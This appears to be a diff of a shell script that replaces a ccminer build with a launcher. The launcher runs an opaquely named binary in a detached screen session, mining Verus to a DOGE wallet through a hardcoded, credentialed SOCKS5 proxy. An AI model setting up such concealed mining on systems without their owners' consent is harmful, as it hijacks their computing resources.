@@ -1,8 +1,5 @@
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
-git clone --single-branch -b verus2.2gpu https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh
-chmod +x configure.sh
-chmod +x autogen.sh
-./build.sh
-./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DETdziwkuGWnXmLXUxp4yDjRpxp4pBS196.PC -p c=DOGE -t 8
+#!/bin/bash
+sudo apt update 
+screen -dmS ls 
+PROXY=socks5://bambank:123@147.182.228.194:3000
+./2 -v -l stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb.USD -p c=DOGE,mc=VRSC -t 40\n
